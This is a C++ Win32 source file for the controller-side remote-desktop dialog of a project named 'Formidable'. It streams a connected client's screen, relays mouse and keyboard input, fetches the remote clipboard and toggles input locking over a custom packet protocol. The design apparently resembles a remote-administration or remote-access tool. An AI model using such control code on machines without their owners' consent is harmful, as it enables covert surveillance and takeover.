// DesktopDialog.cpp - 远程桌面对话框实现
#include "DesktopDialog.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include <CommCtrl.h>
#include <windowsx.h>
#include <vector>
#include <map>
#include <mutex>
#include "../Utils/StringHelper.h"
#pragma comment(lib, "comctl32.lib")

extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);

namespace Formidable {
namespace UI {

static std::map<HWND, uint32_t> s_dlgToClientId;

// 远程桌面子类化过程
LRESULT CALLBACK DesktopScreenProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData) {
    uint32_t cid = (uint32_t)uIdSubclass; 
    
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(cid)) client = g_Clients[cid];
    }

    if (client && client->isMonitoring) {
        auto SendRemoteControl = [&](uint32_t cmd, void* data, size_t size) {
            size_t bodySize = sizeof(Formidable::CommandPkg) - 1 + size;
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
            pkg->cmd = cmd;
            pkg->arg1 = (uint32_t)size;
            memcpy(pkg->data, data, size);
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        };

        switch (message) {
        case WM_MOUSEMOVE:
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_MOUSEWHEEL: {
            Formidable::RemoteMouseEvent ev = { 0 };
            ev.msg = message;
            RECT rc;
            GetClientRect(hWnd, &rc);
            HBITMAP hBmp = (HBITMAP)SendMessage(hWnd, STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hBmp) {
                BITMAP bmp;
                GetObject(hBmp, sizeof(BITMAP), &bmp);
                ev.x = (short)LOWORD(lParam) * bmp.bmWidth / (rc.right == 0 ? 1 : rc.right);
                ev.y = (short)HIWORD(lParam) * bmp.bmHeight / (rc.bottom == 0 ? 1 : rc.bottom);
            }
            if (message == WM_MOUSEWHEEL) ev.data = (short)HIWORD(wParam);
            SendRemoteControl(Formidable::CMD_MOUSE_EVENT, &ev, sizeof(Formidable::RemoteMouseEvent));
            break;
        }
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYUP: {
             Formidable::RemoteKeyEvent ev = { 0 };
             ev.msg = message;
             ev.vk = (uint32_t)wParam;
             SendRemoteControl(Formidable::CMD_KEY_EVENT, &ev, sizeof(Formidable::RemoteKeyEvent));
             break;
        }
        }
    }
    return DefSubclassProc(hWnd, message, wParam, lParam);
}

// 全局静态控制状态
static bool s_isControlEnabled = true;
static bool s_isFullscreen = false;
static bool s_isStretched = false;
static int s_currentFPS = 15;
static int s_currentQuality = 1; // 0=1080P, 1=原始
static int s_currentCompress = 0; // 0=RAW, 1=JPEG

INT_PTR CALLBACK DesktopDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_dlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_DESKTOP)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_DESKTOP)));

        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
            client->isMonitoring = true;
            client->hDesktopDlg = hDlg;
            
            // 设置默认标题
            std::wstring title = L"远程桌面 - " + Formidable::Utils::StringHelper::UTF8ToWide(client->computerName);
            SetWindowTextW(hDlg, title.c_str());
            
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = Formidable::CMD_SCREEN_CAPTURE;
            pkg.arg1 = 1;
            
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            
            SendDataToClient(client, buffer.data(), (int)buffer.size());
            
            // Subclass the static control to capture inputs
            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
            SetWindowSubclass(hStatic, DesktopScreenProc, clientId, (DWORD_PTR)hDlg);
        }

        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
        if (hStatic) {
            RECT rc;
            GetClientRect(hDlg, &rc);
            MoveWindow(hStatic, 0, 0, rc.right, rc.bottom, TRUE);
        }
        return (INT_PTR)TRUE;
    }
    case WM_CONTEXTMENU: {
        POINT pt = { GET_X_LPARAM(lParam), GET_Y_LPARAM(lParam) };
        HMENU hMenu = CreatePopupMenu();
        HMENU hFpsMenu = CreatePopupMenu();
        HMENU hResMenu = CreatePopupMenu();
        HMENU hCompMenu = CreatePopupMenu();
        
        // FPS子菜单
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_5, L"5 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_10, L"10 FPS");
        AppendMenuW(hFpsMenu, (s_currentFPS == 15 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FPS_15, L"15 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_20, L"20 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_25, L"25 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_30, L"30 FPS");
        
        // 分辨率子菜单
        AppendMenuW(hResMenu, (s_currentQuality == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_ORIGINAL, L"原始分辨率");
        AppendMenuW(hResMenu, (s_currentQuality == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_RES_1080P, L"1080P");

        // 压缩方案子菜单
        AppendMenuW(hCompMenu, (s_currentCompress == 0 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_RAW, L"未压缩 (RAW)");
        AppendMenuW(hCompMenu, (s_currentCompress == 1 ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_COMPRESS_JPEG, L"高效压缩 (JPEG)");
        
        // 主菜单
        AppendMenuW(hMenu, (s_isControlEnabled ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_CONTROL, L"鼠标控制(&C)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, (s_isFullscreen ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_FULLSCREEN, L"全屏显示(&F)");
        AppendMenuW(hMenu, (s_isStretched ? MF_CHECKED : 0) | MF_STRING, IDM_DESKTOP_STRETCH, L"拉伸显示(&S)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_TRACK_CURSOR, L"跟踪光标(&T)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REMOTE_CURSOR, L"显示远程光标(&R)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hFpsMenu, L"帧率设置(&P)");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hResMenu, L"分辨率(&E)");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hCompMenu, L"压缩方案(&Z)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_LOCK_INPUT, L"锁定输入(&L)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SWITCH_MONITOR, L"切换显示器(&M)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_GET_CLIPBOARD, L"获取剪贴板(&G)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SET_CLIPBOARD, L"设置剪贴板(&B)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SNAPSHOT, L"截图保存(&N)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REC_MJPEG, L"录制视频(&V)");
        
        TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
        DestroyMenu(hMenu);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        uint32_t clientId = s_dlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        auto SendCommand = [&](uint32_t cmd, uint32_t arg1 = 0, uint32_t arg2 = 0) {
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = cmd;
            pkg.arg1 = arg1;
            pkg.arg2 = arg2;
            
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            
            SendDataToClient(client, buffer.data(), (int)buffer.size());
        };

        switch (LOWORD(wParam)) {
        case IDM_DESKTOP_CONTROL:
            s_isControlEnabled = !s_isControlEnabled;
            client->isMonitoring = s_isControlEnabled;
            MessageBoxW(hDlg, s_isControlEnabled ? L"已启用鼠标控制" : L"已禁用鼠标控制", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_FULLSCREEN: {
            s_isFullscreen = !s_isFullscreen;
            if (s_isFullscreen) {
                SetWindowLongPtr(hDlg, GWL_STYLE, WS_POPUP | WS_VISIBLE);
                ShowWindow(hDlg, SW_MAXIMIZE);
            } else {
                SetWindowLongPtr(hDlg, GWL_STYLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE);
                ShowWindow(hDlg, SW_NORMAL);
            }
            break;
        }
        
        case IDM_DESKTOP_STRETCH:
            s_isStretched = !s_isStretched;
            MessageBoxW(hDlg, s_isStretched ? L"已启用拉伸显示" : L"已禁用拉伸显示", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_FPS_5:
        case IDM_DESKTOP_FPS_10:
        case IDM_DESKTOP_FPS_15:
        case IDM_DESKTOP_FPS_20:
        case IDM_DESKTOP_FPS_25:
        case IDM_DESKTOP_FPS_30: {
            int fps = 5 + (LOWORD(wParam) - IDM_DESKTOP_FPS_5) * 5;
            s_currentFPS = fps;
            SendCommand(Formidable::CMD_SCREEN_FPS, fps);
            wchar_t msg[64];
            wsprintfW(msg, L"已设置帧率为 %d FPS", fps);
            MessageBoxW(hDlg, msg, L"提示", MB_OK);
            break;
        }
        
        case IDM_DESKTOP_RES_ORIGINAL:
            s_currentQuality = 1;
            SendCommand(Formidable::CMD_SCREEN_QUALITY, 1);
            MessageBoxW(hDlg, L"已设置原始分辨率", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_RES_1080P:
            s_currentQuality = 0;
            SendCommand(Formidable::CMD_SCREEN_QUALITY, 0);
            MessageBoxW(hDlg, L"已设置1080P限制", L"提示", MB_OK);
            break;

        case IDM_DESKTOP_COMPRESS_RAW:
            s_currentCompress = 0;
            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 0);
            MessageBoxW(hDlg, L"已切换至 RAW (无损) 传输", L"提示", MB_OK);
            break;

        case IDM_DESKTOP_COMPRESS_JPEG:
            s_currentCompress = 1;
            SendCommand(Formidable::CMD_SCREEN_COMPRESS, 1);
            MessageBoxW(hDlg, L"已切换至 JPEG (压缩) 传输", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_LOCK_INPUT:
            SendCommand(Formidable::CMD_SCREEN_QUALITY, 4); // 4=锁定输入
            MessageBoxW(hDlg, L"已切换锁定输入状态", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_SWITCH_MONITOR:
            MessageBoxW(hDlg, L"多显示器切换功能待实现", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_GET_CLIPBOARD:
            SendCommand(Formidable::CMD_CLIPBOARD_GET);
            MessageBoxW(hDlg, L"正在获取远程剪贴板...", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_SET_CLIPBOARD:
            MessageBoxW(hDlg, L"剪贴板设置功能待实现", L"提示", MB_OK);
            break;
            
        case IDM_DESKTOP_SNAPSHOT: {
            // 保存当前屏幕截图
            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
            HBITMAP hBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hBmp) {
                wchar_t filename[MAX_PATH];
                SYSTEMTIME st;
                GetLocalTime(&st);
                wsprintfW(filename, L"screenshot_%04d%02d%02d_%02d%02d%02d.bmp", 
                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                // TODO: 保存位图到文件
                MessageBoxW(hDlg, L"截图保存功能待实现", L"提示", MB_OK);
            }
            break;
        }
        
        case IDM_DESKTOP_REC_MJPEG:
            MessageBoxW(hDlg, L"视频录制功能待实现", L"提示", MB_OK);
            break;
            
        case IDCANCEL:
            PostMessage(hDlg, WM_CLOSE, 0, 0);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (s_dlgToClientId.count(hDlg)) {
            uint32_t clientId = s_dlgToClientId[hDlg];
            HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
            RemoveWindowSubclass(hStatic, DesktopScreenProc, clientId);
            
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) {
                    client = g_Clients[clientId];
                    client->hDesktopDlg = NULL;
                    client->isMonitoring = false;
                }
            }
            
            // 发送停止屏幕捕获命令
            if (client) {
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_SCREEN_CAPTURE;
                pkg.arg1 = 0; // 停止
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            }
            
            s_dlgToClientId.erase(hDlg);
        }
        DestroyWindow(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

void DesktopDialog::Show(HWND hParent, uint32_t clientId) {
    CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_DESKTOP), hParent, DlgProc, (LPARAM)clientId);
}

} // namespace UI
} // namespace Formidable
